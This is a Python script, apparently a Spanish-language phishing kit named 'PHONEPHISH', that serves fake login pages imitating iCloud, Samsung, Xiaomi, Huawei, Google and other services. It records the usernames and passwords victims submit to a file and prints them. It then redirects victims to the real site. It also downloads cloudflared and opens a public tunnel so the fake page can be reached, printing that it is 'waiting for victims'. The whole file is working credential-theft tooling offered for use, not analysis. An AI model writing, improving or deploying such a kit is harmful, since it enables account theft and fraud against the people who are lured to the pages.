import os
import threading
import subprocess
import platform
import re
from time import sleep
from flask import Flask, render_template, redirect, request

# Configuración de servicios (Lista completa de la imagen)
SERVICIOS = {
    "01": ("iCloud", "https://www.icloud.com"),
    "02": ("Samsung", "https://account.samsung.com"),
    "03": ("Xiaomi", "https://account.xiaomi.com"),
    "04": ("Huawei", "https://id7.cloud.huawei.com"),
    "05": ("Motorola", "https://motorola.cl"),
    "06": ("Oppo", "https://id.oppo.com"),
    "07": ("Google", "https://google.com"),
    "08": ("Junaeb", "https://junaeb.cl"),



}

def detectar_sistema():
    sistema = platform.system()
    
    if sistema == "Windows":
        binario = "cloudflared.exe"
        if not os.path.exists(binario):
            print("\033[1;33m[*] Cloudflared no detectado. Descargando para Windows...\033[0m")
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            # Descarga usando PowerShell en Windows
            subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {url} -OutFile {binario}"])
        return "PC", f"./{binario}"
    
    else:
        # Asumimos Termux o Linux
        binario = "cloudflared"
        if not os.path.exists(binario):
            print("\033[1;33m[*] Cloudflared no detectado. Instalando en Termux...\033[0m")
            # Detectar si es ARM (celular) o x86
            arch = platform.machine()
            if "arm" in arch or "aarch64" in arch:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            
            # Descarga usando wget (común en Termux)
            try:
                subprocess.run(["wget", url, "-O", binario])
                subprocess.run(["chmod", "+x", binario])
            except FileNotFoundError:
                print("\033[1;31m[!] Error: Necesitas instalar wget (pkg install wget)\033[0m")
                os._exit(1)
                
        return "TERMUX/ANDROID", f"./{binario}"

def iniciar_servidor(plantilla, url_real):
    app = Flask(__name__)
    @app.route('/')
    def index(): return render_template(plantilla)
    @app.route('/submit', methods=['POST'])
    def submit():
        u, p = request.form.get('username'), request.form.get('password')
        if u and p:
            with open('datos.txt', 'a') as f:
                f.write(f"Servicio: {plantilla} | User: {u} | Pass: {p}\n")
                print(f"\n\nUsuario: {u} | Password: {p}\n")
            return redirect(url_real)
        return redirect('/')
    app.run(port=5000, debug=False, use_reloader=False)

def obtener_link_cloudflare(binario):
    print("\033[1;33m[*] Generando link seguro... (espera 5-10 seg)\033[0m")
    # Ejecutamos cloudflared capturando la salida de error (donde envía el link)
    proceso = subprocess.Popen(
        [binario, 'tunnel', '--url', 'http://127.0.0.1:5000'],
        stderr=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        text=True
    )
    
    link = None
    while True:
        linea = proceso.stderr.readline()
        if not linea: break
        # Buscamos la URL que termina en .trycloudflare.com
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', linea)
        if match:
            link = match.group(0)
            print(f"\n\033[1;32m[+] LINK PUBLICO: {link}\033[0m")
            print("\033[1;36m[*] Esperando victimas... (No cierres esta ventana)\033[0m")
            break
    return proceso

def menu():
    tipo, bin_cf = detectar_sistema()
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[1;31m") 
        print(r"""
  _____  _    _  ____  _   _ ______ _____  _    _ _____  _____ _    _ 
 |  __ \| |  | |/ __ \| \ | |  ____|  __ \| |  | |_   _|/ ____| |  | |
 | |__) | |__| | |  | |  \| | |__  | |__) | |__| | | | | (___ | |__| |
 |  ___/|  __  | |  | | . ` |  __| |  ___/|  __  | | |  \___ \|  __  |
 | |    | |  | | |__| | |\  | |____| |    | |  | |_| |_ ____) | |  | |
 |_|    |_|  |_|\____/|_| \_|______|_|    |_|  |_|_____|_____/|_|  |_|
    """)
        print(f"\033[1;37m  ────────────────────────────────────────────────────────────")
        print(f"\033[1;31m  [>] Autor: \033[1;37mHans Saldias \033[1;31m| \033[1;36mMODO: \033[1;33m{tipo}")
        print(f"\033[1;31m  [>] Versión: \033[1;32m1.0 Official")
        print("\033[1;37m  ────────────────────────────────────────────────────────────\033[0m")
        keys = list(SERVICIOS.keys())
        for i in range(10):
            row = ""
            for j in range(i, len(keys), 10):
                id_s = keys[j]
                row += f" [{id_s}] {SERVICIOS[id_s][0].ljust(15)} "
            print(row)
        print("\n [00] Datos [x] Salir")
        
        op = input("\nSeleccione: ").strip()
        if op.lower() == 'x': os._exit(0)
        
        if op in SERVICIOS:
            nombre, url = SERVICIOS[op]
            # Iniciar servidor en hilo
            threading.Thread(target=iniciar_servidor, args=(f"{nombre.lower()}.html", url), daemon=True).start()
            sleep(1)
            # Obtener y mostrar solo el link
            proc_cf = obtener_link_cloudflare(bin_cf)
            input("\nPresione ENTER para detener el tunel y volver al menu...")
            proc_cf.terminate() # Mata el proceso de cloudflare al salir
        elif op == "00":
            if os.path.exists('datos.txt'):
                with open('datos.txt', 'r') as f: print("\n" + f.read())
            input("\nEnter para continuar...")

if __name__ == '__main__':
    menu()